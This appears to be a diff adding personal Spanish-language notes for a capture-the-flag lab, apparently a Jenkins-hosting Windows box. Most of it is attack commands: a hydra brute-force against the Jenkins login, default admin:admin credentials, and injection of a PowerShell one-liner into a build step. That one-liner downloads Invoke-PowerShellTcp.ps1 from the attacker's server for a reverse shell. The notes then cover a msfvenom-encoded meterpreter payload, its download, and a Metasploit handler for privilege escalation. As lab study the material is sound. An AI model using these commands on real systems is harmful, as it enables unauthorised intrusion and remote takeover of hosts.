@@ -1,0 +1,63 @@
+
+
+
+80 :
+
+	correo : alfred@wayneenterprises.com
+
+
+	-dirb
+
+	
+8080 :
+	version : jetkins 9.4
+
+	- hydra -l admin -P rockyou.txt 10.10.142.222 -V http-form-post "/login?from=%2Fl:j_username=^USER^&j_password
+	=^PASS^&from=%2Fl&Submit=Sign+in:F=incorrect"
+
+	
+	la contra es admin:admin
+
+	- En la configuracion de proyectos dentro de la pagina ejecuta comandos y ahi podemos inyectar codigo malicioso.
+	
+	- powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');
+	Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port	
+
+	- llenamos ese comando en la pagina lo guardamos y abrimos nuestro servidor http de donde va a descargar el file :
+	Invoke-PowerShellTcp.ps1 .
+
+	- python3 -m http.server : se abre por defecto en el puerto 8000.
+
+	- luego usamos nuestro listener : nc -lvnp <port>
+
+	- obtenemos el bash.
+
+
+ESCALADA DE PRIVILEGIOS :
+
+	- msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder 
+         x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe
+
+		con eso creamos el payload que sera el shell reverse pero nos devolvera un meterpreter.
+
+	
+	- dentro de la shell normal ejecutamos :
+	 powershell "(New-Object System.Net.WebClient).Downloadfile('http://<ip>:8000/shell-name.exe','shell-name.exe')"
+		esto descargara la shell meterpreter que hemos creado.
+	
+	- ahora para escuchar y nos devuleva esa shell meterpreter necesitamos el listener :
+		
+		use exploit/multi/handler
+		set PAYLOAD windows/meterpreter/reverse_tcp
+		set LHOST tun0
+		set LPORT <port>
+		run
+
+	- Start-Process "shell-name.exe"
+
+
+	
+	 
+
+
+	
